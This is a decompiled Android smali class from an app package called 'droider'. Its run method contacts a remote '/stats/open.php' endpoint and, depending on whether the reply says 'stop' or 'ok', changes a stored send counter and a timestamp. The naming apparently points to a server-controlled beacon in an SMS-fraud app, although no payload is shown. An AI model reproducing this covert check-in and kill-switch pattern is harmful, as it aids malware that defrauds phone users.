.class Leu/evandorostech/droider/ClassAct$2;
.super Ljava/lang/Object;
.source "ClassAct.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Leu/evandorostech/droider/ClassAct;->f2()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Leu/evandorostech/droider/ClassAct;


# direct methods
.method constructor <init>(Leu/evandorostech/droider/ClassAct;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Leu/evandorostech/droider/ClassAct$2;->this$0:Leu/evandorostech/droider/ClassAct;

    .line 124
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 7

    .prologue
    .line 126
    const/4 v2, 0x0

    .line 128
    .local v2, "otvet":Ljava/lang/String;
    :try_start_0
    iget-object v4, p0, Leu/evandorostech/droider/ClassAct$2;->this$0:Leu/evandorostech/droider/ClassAct;

    new-instance v5, Ljava/lang/StringBuilder;

    iget-object v6, p0, Leu/evandorostech/droider/ClassAct$2;->this$0:Leu/evandorostech/droider/ClassAct;

    iget-object v6, v6, Leu/evandorostech/droider/ClassAct;->q3:Ljava/lang/String;

    invoke-static {v6}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "/stats/open.php"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    iget-object v6, p0, Leu/evandorostech/droider/ClassAct$2;->this$0:Leu/evandorostech/droider/ClassAct;

    iget-object v6, v6, Leu/evandorostech/droider/ClassAct;->q2:Ljava/lang/String;

    invoke-virtual {v4, v5, v6}, Leu/evandorostech/droider/ClassAct;->doInBackground(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v2

    .line 133
    :goto_0
    if-eqz v2, :cond_2

    .line 134
    const-string v4, "stop"

    invoke-virtual {v2, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_0

    .line 135
    iget-object v4, p0, Leu/evandorostech/droider/ClassAct$2;->this$0:Leu/evandorostech/droider/ClassAct;

    iget-object v4, v4, Leu/evandorostech/droider/ClassAct;->q8:Landroid/content/Context;

    const-string v5, "ESLIABONENTTUPIT"

    const/4 v6, 0x0

    invoke-virtual {v4, v5, v6}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    .line 136
    .local v3, "settings":Landroid/content/SharedPreferences;
    invoke-interface {v3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    .line 137
    .local v1, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v4, "countsend"

    const/16 v5, 0x14

    invoke-interface {v1, v4, v5}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 140
    .end local v1    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v3    # "settings":Landroid/content/SharedPreferences;
    :cond_0
    const-string v4, "ok"

    invoke-virtual {v2, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_1

    .line 141
    iget-object v4, p0, Leu/evandorostech/droider/ClassAct$2;->this$0:Leu/evandorostech/droider/ClassAct;

    iget-object v5, p0, Leu/evandorostech/droider/ClassAct$2;->this$0:Leu/evandorostech/droider/ClassAct;

    invoke-virtual {v5}, Leu/evandorostech/droider/ClassAct;->GetUnixTime()I

    move-result v5

    invoke-static {v5}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v5

    iput-object v5, v4, Leu/evandorostech/droider/ClassAct;->q10:Ljava/lang/String;

    .line 149
    :goto_1
    return-void

    .line 129
    :catch_0
    move-exception v0

    .line 131
    .local v0, "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0

    .line 144
    .end local v0    # "e":Ljava/io/IOException;
    :cond_1
    iget-object v4, p0, Leu/evandorostech/droider/ClassAct$2;->this$0:Leu/evandorostech/droider/ClassAct;

    const-string v5, "0"

    iput-object v5, v4, Leu/evandorostech/droider/ClassAct;->q10:Ljava/lang/String;

    goto :goto_1

    .line 147
    :cond_2
    iget-object v4, p0, Leu/evandorostech/droider/ClassAct$2;->this$0:Leu/evandorostech/droider/ClassAct;

    const-string v5, "0"

    iput-object v5, v4, Leu/evandorostech/droider/ClassAct;->q10:Ljava/lang/String;

    goto :goto_1
.end method
